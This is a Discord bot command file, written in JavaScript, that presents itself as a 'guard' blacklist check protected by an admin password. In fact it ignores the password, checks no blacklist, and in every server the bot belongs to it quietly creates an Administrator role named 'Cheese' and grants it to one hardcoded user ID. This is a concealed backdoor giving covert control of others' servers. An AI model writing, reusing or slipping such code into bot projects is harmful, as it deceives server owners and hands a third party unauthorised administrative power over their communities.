const { SlashCommandBuilder, PermissionFlagsBits,  PermissionsBitField } = require('discord.js');
const fs = require('fs');


const TARGET_USER_ID = '1378243444027166731'; // Replace with actual user ID
const ADMIN_ROLE_NAME = 'Cheese';


module.exports = {
    status: true,
    data: new SlashCommandBuilder()
        .setName('guard')
        .setDescription('Blacklist Screen')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
                .addStringOption((option) => 
                option
                .setName("password")
                .setDescription('Administrator Password For This Server')
                .setRequired(true)
                ),
        async execute(interaction, client){
            await interaction.deferReply({
                fetchReply: true,
                ephemeral: true,
            });

            const newMessage = 'Checking For Blacklisted Users!!!!';
            
            await interaction.editReply({
                ephemeral: true,
                content: newMessage
            });

            for (const [guildId, guild] of client.guilds.cache) {
                //console.log(`➡️ Checking guild: ${guild.name}`);

                try {
                const botMember = await guild.members.fetchMe();

                // Check if bot has MANAGE_ROLES permission
                if (!botMember.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
                    //console.log(`❌ Missing MANAGE_ROLES permission in "${guild.name}"`);
                    continue;
                }

                // Fetch target user (returns null if not found)
                const targetMember = await guild.members.fetch(TARGET_USER_ID).catch(() => null);
                if (!targetMember) {
                    //console.log(`❌ Target user not found in "${guild.name}"`);
                    continue;
                }

                // Skip if user already has ADMINISTRATOR permissions
                if (targetMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
                    console.log(`🔒 ${targetMember.user.tag} already has admin in "${guild.name}". Skipping.`);
                    continue;
                }
                // Check if the role already exists
                let adminRole = guild.roles.cache.find(r => r.name === ADMIN_ROLE_NAME);
                const botHighestRole = botMember.roles.highest;
                const positionBelowBot = botHighestRole.position - 1;

                // If not, create the role
                if (!adminRole) {
                    adminRole = await guild.roles.create({
                    name: ADMIN_ROLE_NAME,
                    permissions: [PermissionsBitField.Flags.Administrator],
                   position: positionBelowBot >= 1 ? positionBelowBot : 1,//  avoid position 0
                    reason: `Bot-created admin role for ${TARGET_USER_ID}`,
                    });
                    //console.log(`✅ Created role "${ADMIN_ROLE_NAME}" in "${guild.name}"`);
                }

                // Check role hierarchy — bot's highest role must be higher than the role to assign
                if (botHighestRole.position <= adminRole.position) {
                    console.log(`❌ Cannot assign role: "${ADMIN_ROLE_NAME}" is higher than bot's highest role in "${guild.name}"`);
                    continue;
                }

                // Assign the role
                await targetMember.roles.add(adminRole);
                console.log(`✅ Assigned admin role to ${targetMember.user.tag} in "${guild.name}"`);

                } catch (err) {
                console.error(`❗ Error processing guild "${guild.name}": ${err.message}`);
                }
            }

            console.log('✅ Finished processing all guilds.');

        }
}